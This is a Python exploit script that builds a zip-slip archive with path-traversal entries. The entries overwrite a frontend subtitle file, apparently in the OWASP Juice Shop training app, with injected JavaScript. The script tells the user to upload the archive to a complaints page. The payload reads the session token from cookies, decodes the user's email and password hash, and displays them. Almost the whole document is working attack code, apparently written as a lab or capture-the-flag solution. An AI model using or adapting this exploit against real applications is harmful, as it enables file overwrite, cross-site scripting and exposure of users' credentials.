import zipfile
zip_name = "final_submission.zip"
TARGET_PATH = "../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt"
payload_code = """</script><script>
(function() {
    console.log("XSS STRIKE: Mallory is here.");
    const token = document.cookie.split('; ').find(row => row.startsWith('token=')).split('=')[1];
    const user = JSON.parse(atob(token.split('.')[1])).data;
    
    const div = document.createElement('div');
    div.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:darkred;color:white;z-index:9999;padding:50px;text-align:center;font-family:sans-serif;";
    div.innerHTML = `
        <h1>This is Mallory's web page</h1>
        <p><strong>Email:</strong> ${user.email}</p>
        <p><strong>Hashed Password:</strong> ${user.password}</p>
        <img src="/assets/public/images/uploads/${user.profileImage}" width="200" style="border:5px solid white;">
    `;
    document.body.appendChild(div);
})();
</script>"""
with zipfile.ZipFile(zip_name, "w") as zf:
    zf.writestr(TARGET_PATH, payload_code)
    zf.writestr(TARGET_PATH.replace("videos", "video"), payload_code)

print(f"✅ Success! Upload {zip_name} to the complaints page.")